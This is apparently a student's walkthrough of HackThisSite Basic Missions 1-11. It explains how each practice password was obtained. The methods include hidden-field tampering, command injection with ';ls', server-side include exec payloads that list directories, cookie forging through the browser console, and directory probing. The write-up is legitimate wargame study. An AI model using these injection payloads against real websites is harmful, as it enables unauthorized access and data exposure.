# HACK THIS SITE

The "how I did it" for the hack this site challenges for class where I had to complete the Basic Missions 1-10 ( with a bonus 11 ).

---

## Challenge 1

This is what they call the "idiot test" -- the answer is found simply by viewing the source on the web page; and on line 142 we find the password and a hint for the challenges yet to come :

`<!-- the first few levels are extremely easy: password is 02a10c4d -->`

---

## Challenge 2

Network Security Sam, at it again! And a hint " load the real password from an unencrypted text file" and then it "compare it to the password the user enters" ... so....

If no password file is uploaded, then, by comparing nothing to nothing == pass. So, input nothing. Boom!

---

## Challenge 3

In this case we find a more interesting login form:

```
  <form action="/missions/basic/3/index.php" method="post">
  <input type="hidden" name="file" value="password.php" />
  <input type="password" name="password" /><br /><br />
  <input type="submit" value="submit" /></form>
```

Notice the `/missions/basic/3/index.php` is a full path to the exact same page as `/missions/basic/3/`; and so, following that logic -- what if we put `password.php` in there to be able to check if we can get that file?

Bingo!

At https://www.hackthissite.org/missions/basic/3/password.php we find the password:
`58ad624f`

---

## Challenge 4

Just gotta send an e-mail to myself. :)

```
  <form action="/missions/basic/4/level4.php" method="post">
  <input type="hidden" name="to" value="sam@hackthissite.org" /><input type="submit" value="Send password to Sam" /></form></center><br /><br /><center><b>Password:</b><br />
  <form action="/missions/basic/4/index.php" method="post">
  <input type="password" name="password" /><br /><br />
  <input type="submit" value="submit" /></form>
```

Replace `sam@hackthissite.org` with the email you want to have the password sent to and get the password `a81499d9`.

---

## Challenge 5

So, same thing -- just replaced `sam@hackthissite.org` with the email you want to have the password sent to.

```
  <form action="/missions/basic/5/level5.php" method="post"><input type="hidden" name="to" value="sam@hackthissite.org" />
  <input type="submit" value="Send password to Sam" /></form></center><br /><br /><center><b>Password:</b><br />
  <form action="/missions/basic/5/index.php" method="post"><input type="password" name="password" /><br /><br />
  <input type="submit" value="submit" /></form>
```

Then we get a nice little email with the password

```
Sam,
Here is the password: '375e08c0'.
```

---

## Challenge 6

Sam has gone and rolled his own crypto... dope!

```
  <form action="/missions/basic/6/encrypt.php" method="post">
  <input type="text" name="text" /><br />
  <input type="submit" value="encrypt" /></form></center>
  <center>You have recovered his encrypted password. It is:<br /><br /><b>9b;eh5::</b><br /><br />
  Decrypt the password and enter it below to advance to the next level.<br /><br /><center><b>Password:</b><br /><form action="/missions/basic/6/index.php" method="post"><input type="password" name="password" /><br /><br /><input type="submit" value="submit" /></form></center>
  </td>
```

So, let's dissect this a little bit. We know the password when encrypted is 9b;eh5:: -- and so we simply need to figure out how to reverse this home-grown crypto. Ok, let's mess with it. In the form there is the link `/missions/basic/6/encrypt.php` which has the form just for encrypting. Let's use that.

So, let's do some science things to it. Let's test some data.

When I put in a `z` for my input, I get a `z` output.

So, let's so some more of them? See if there can be any obvious clues about what's going on with the string. Especially to give the same output for the same input for the z character? Does that happen for another character?

When I put in a `x` for my input, I get a `x` output.

Let's try some more, and make a hash ( key, value pair )

```
  'z' => 'z'
  'x' => 'x'
 'zz' => 'z{'
  '{' => '{'
 'xx' => 'xy'
  'y' => 'y'
 'xy' => 'xz'
```

And, at this point I start to figure out what's going on; and I found the circular logic in it.

Hypothesis: `abc` will become `acd` ... But, no: When I put in a `abc` for my input, I get a `ace` output.

Ok, so, hypothesis is wrong... It moves 1 letter to the right for the 2nd char, and two for the 3rd char?

Hypothesis: `efg` should then be `egi`! ... So, I test it: When I put in a `efg` for my input, I get a `egi` output.

Bingo!

So, time to figure out `9b;eh5::` in plain text....

I know that when I put in a `9a` for my input, I get a `9b` output.

What's interesting is all the extra chars... so, ascii perhaps?

In fact, if we look at an ascii table, we see that `{` is one char to the right like we learned in our previous tests.

So, I use an ascii table to help me ( if it were any longer I may have written a script ... )

[ASCII Table](http://www.asciitable.com/)

When I put in a `9a` for my input, I get a `9b` output.

When I put in a `9a9` for my input, I get a `9b;` output.

When I put in a `9a9b` for my input, I get a `9b;e` output.

When I put in a `9a9b` for my input, I get a `9b;e` output.

When I put in a `9a9b` for my input, I get a `9b;e` output.

So on...

```
 '9' => '9' # 0 places to the right
 'b' => 'a' # 1 places to the right
 ';' => '9' # 2 places to the right
 'e' => 'b' # 3 places to the right
 'h' => 'd' # 4 places to the right
 '5' => '0' # 5 places to the right
 ':' => '4' # 6 places to the right
 ':' => '3' # 7 places to the right
```

And, we get our password!

`9a9bd043`

---

## Challenge 7

I suspect "Sam has set up a script that returns the output from the UNIX cal command" to be a hint of where to find " the unencrypted level 7 password in an obscurely named file saved in this very directory". If I put a ';' to terminate the current command of the cal command which I expect to be user input being directly passed into the shell. So, if I put in something like `;ls` -- then I should see a listing of directories.

Bingo!

```
cal.pl
index.php
k1kh31b1n55h.php
level7.php
```

And so now I guess that `k1kh31b1n55h.php` is the "obscurely named file", which it is : `30bf0cee`

---

## Challenge 8

I suspect that the fact that this `<form action="/missions/basic/8/level8.php" method="post">` is going to be a problem for ol' Sammy boy here. So, let's put in an example input to see what this program will do. So, in the enter your name field I put: "picatz", as this'll work.

A file is then generated, but first I am sent to a html page with a link to this file:

```
Hi, picatz!

Your name contains 6 characters.
```

So, it's taking in user input. Ok. Let's try to do some injection to see what kind of sillyness we can achieve. But, first some OWSAP knowledge for a better understanding because Google is awesome:

```
SSIs are directives present on Web applications used to feed an HTML page with dynamic contents. They are similar to CGIs, except that SSIs are used to execute some actions before the current page is loaded or while the page is being visualized. In order to do so, the web server analyzes SSI before supplying the page to the user.
```

Ok, so, OWSAP says "It is possible to check if the application is properly validating input fields data by inserting characters that are used in SSI directives, like:"

`< ! # = / . " - > and [a-zA-Z0-9] `

So, let's prepare ourselves a lil bit O'magic here to be able to travel up one directory where we're given a hint that "/var/www/hackthissite.org/html/missions/basic/8/" is where the "unencrypted password file" is:

```
<!-- #exec cmd = "ls ../" -->
```

Then the website throws this at me:

```
If you are trying to use server side includes to solve the challenge, you are on the right track: but I have limited the commands allowed to ones relevant towards finding the password file for security reasons(because there will always be that one person who decides to execute some rather nasty commands). So please manipulate your code so that it is a little more pertaining to the level.
```

So, I do a little more google'n and I then decide to take out the spaces:

```
<!--#exec cmd="ls ../"-->
```

Cool, I get that redirect now instead of an error!

```
Your file has been saved. Please click here view the file.
```

So, I click it!

```
Hi, au12ha39vc.php index.php level8.php tmp!

Your name contains 39 characters.
```

Bingo! The server side injection worked!

So, I travel to:

```
https://www.hackthissite.org/missions/basic/8/au12ha39vc.php
```

And then I get the password:

```
a6ef4250
```

---

## Challenge 9

So, we're give a few hints for this challenge which is rather nice: "he's determined to keep obscuring the password file, no matter how many times people manage to recover it", "saved in /var/www/hackthissite.org/html/missions/basic/9/", "limit people to using server side includes to display the directory listing to level 8 only, I have mistakenly screwed up somewhere..", "level seems a lot trickier then it actually is", "script finds the first occurance of '<--', and looks to see what follows directly after it" ...

Ok, so that's a lot -- I wonder if 1. the previous ssi is going to work, and 2. if it's just more directory traversals.

We be prepare'n that magic:

```
<!--#exec cmd="ls ../../9"-->
```

But, there's no where to insert this stuff for challenge 9... what?

Ok, so, maybe challenge 8 -- as this challenge description sort of refers to it and it being linked and all that.

Bingo!

```
Hi, index.php p91e283zc3.php!

Your name contains 24 characters.
```

So, when I travel to `https://www.hackthissite.org/missions/basic/9/p91e283zc3.php` I get the password:

```
fc8335a5
```

---

## Challenge 10

Cookies, all about them cookies.

So, on this web page we have a cookie that is givith toith to usth by the website lord. Now, we must edit this cookie to give us more powers. In this case, I am using the EditThisCookie chrome extension to look at this magic.

On this page we have a cookie `level10_authorized` that is set by www.hackthissite.org and is set to `no` which is sad. I assume we want it to be yes. In google chrome we have a console menu which allows us to write in javascript things such as:

```
document.cookie="level10_authorized=yes"
```

So, no whatever I type in for the password, as long as I have previously set my authorized to "yes" in console, it'll all work out!

Yay!


---

## Challenge 11

For challenge 11, they warn you it's going to be different. When you click on the challenge link, you're taken to a page like this:

At https://www.hackthissite.org/missions/basic/11/:
```
I love my music! "I Don't Wanna Go on with You Like That" is the best!
```

They also give you a hint : "Sam decided to make a music site. Unfortunately he does not understand Apache. This mission is a bit harder than the other basics."

And, with that apache hint, I have some hunches. I try messing with the path to get .htaccess to appear but it's not working.

So, lets try something pretty simple like `index` and see what that gives us: `https://www.hackthissite.org/missions/basic/11/index`

```
I love my music! "Val-Hala" is the best!
```

Interesting, in fact it's actually listing different ones each time?

```
I love my music! "I Guess That's Why They Call It the Blues" is the best!
```

```
I love my music! "Bad Side of the Moon" is the best!
```

Ok then. Let's try some basic fuzzying to see what we get, and after some weird attempts I get something wierd for `https://www.hackthissite.org/missions/basic/11/e/` where I am taken to a page with an index!

```
Index of /missions/basic/11/e

Parent Directory
l/
```

So, I click my way down the rabbit hole till I end up at:

```
Index of /missions/basic/11/e/l/t/o/n

Parent Directory
```

Huh... Ok... Nothing interesting. So, I go back to /e/ and try to get .htaccess to no avail. But, then I think: I wonder if they did the elton thing to ... so I got there...

Bingo! We can access the .htaccess file! `https://www.hackthissite.org/missions/basic/11/e/l/t/o/n/.htaccess`

```
IndexIgnore DaAnswer.* .htaccess
<Files .htaccess>
order allow,deny
allow from all
</Files>
```

So, we go to `https://www.hackthissite.org/missions/basic/11/e/l/t/o/n/DaAnswer` and we get the following:

```
The answer is simple! Just look a little harder.
```

There's nothing else on the page and after some frustrating directory traversing and other manners of failure I put in the password: "simple" for challenge 11 and get the answer.

They were being cute and making it a riddle... ok then.

But, BINGO! We dun did it!

We simply have to go to: `https://www.hackthissite.org/missions/basic/11/index.php` and submit the password now.

